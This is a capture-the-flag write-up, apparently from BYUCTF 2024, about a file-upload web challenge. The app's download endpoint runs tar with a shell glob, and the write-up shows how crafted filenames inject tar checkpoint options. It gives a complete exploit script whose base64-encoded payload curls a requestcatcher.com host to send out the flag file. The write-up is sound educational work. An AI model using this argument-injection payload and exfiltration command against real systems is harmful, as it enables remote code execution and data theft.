https://ctftime.org/event/2252/

# Argument - (Web)

I just wanted to make a simple application where people can store files. But I'm a good college student and have taken web security classes, so I'm aware of all the vulnerabilities that may exist and made my app perfectly secure! There's no way you'd be able to get the flag...

## Solution
At first look I thought this challenge have to do with symlinks or bypassing the filters.
But it actually is about a very obscure interaction, I only found out when my teammate showed it.

First the challenge features:
- you can upload any file with size < 1000
- you can upload any file that doesnt have `..` or `/` on the name
- you can download all the files that you uploaded as a tar file

The vulnerability is on the download endpoint:
```python
os.system(f"cd uploads/{g.uuid}/ && tar -cf out.tar *")
```

The vulnerability here is the use of the glob operator ```*```, 
Basically the way it works is, it expands whatever is on the current dir to the command line
So if we can upload a file called ```-v``` we would toggle the verbose flag on tar
And together with some more obscure tar features we can execute code:

https://www.exploit-db.com/papers/33930

The full solution script:
```python
import requests, uuid, base64

# REMOTE = 'http://localhost:40000'
REMOTE = 'https://argument.chal.cyberjousting.com'
ID = str(uuid.uuid4())

p = '''import subprocess;subprocess.run("curl https://1.requestcatcher.com/12?a=$(cat /flag* |base64)", shell=True)'''
pay = base64.b64encode(p.encode())
exp = f"""python -c \"import base64; exec(base64.b64decode(\\\\"{pay.decode()}\\\\"))\""""

if '/' in exp:
    print(f"DEBUGPRINT[12]: lab.py:11: exp={exp}")
    exit(1)

def upload():
    file = open('somefile', 'rb')

    res = requests.post(REMOTE + '/api/upload',
                        cookies={'uuid': ID},
                        files = {
                          'file':('out.tar', file, 'plain/text')
                        })

    res = requests.post(REMOTE + '/api/upload',
                        cookies={'uuid': ID},
                        files = {
                          'file':('--checkpoint=1', file, 'plain/text')
                        })

    res = requests.post(REMOTE + '/api/upload',
                        cookies={'uuid': ID},
                        files = {
                          'file':(f'--checkpoint-action=exec=' + exp, file, 'plain/text')
                        })

def listr():
    res = requests.get(REMOTE + '/', cookies={'uuid': ID})


def download(): 
    res = requests.get(REMOTE + '/api/download', cookies={'uuid': ID})

upload()
time.sleep(1)
download()
```

## Flag
`byuctf{argument_injection_stumped_me_the_most_at_D3FC0N_last_year}`

shafou - 18/05/2024
